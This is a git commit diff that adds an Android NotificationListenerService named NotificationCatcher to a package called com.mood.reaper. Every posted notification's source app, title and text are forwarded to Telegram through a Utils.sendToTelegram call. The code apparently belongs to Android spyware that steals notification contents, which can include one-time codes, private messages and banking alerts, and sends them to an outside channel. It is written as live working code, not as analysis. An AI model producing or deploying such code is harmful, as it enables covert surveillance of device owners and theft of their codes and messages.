830fe9e61861044f182685e3778ac55b3aaad14b
sayaaaaaaa796-cmd <sayaaaaaaa796@gmail.com>
2026-07-30 12:55:23 +0700

    Update NotificationCatcher.java

--- app/src/main/java/com/mood/reaper/NotificationCatcher.java
+++ app/src/main/java/com/mood/reaper/NotificationCatcher.java
@@ -1,1 +1,14 @@
-.
+package com.mood.reaper;
+
+import android.service.notification.NotificationListenerService;
+import android.service.notification.StatusBarNotification;
+
+public class NotificationCatcher extends NotificationListenerService {
+    @Override
+    public void onNotificationPosted(StatusBarNotification sbn) {
+        String pkg = sbn.getPackageName();
+        String title = sbn.getNotification().extras.getString("android.title");
+        String text = sbn.getNotification().extras.getString("android.text");
+        Utils.sendToTelegram("🔔 Notif dari " + pkg + "\n📌 " + title + "\n" + text);
+    }
+}
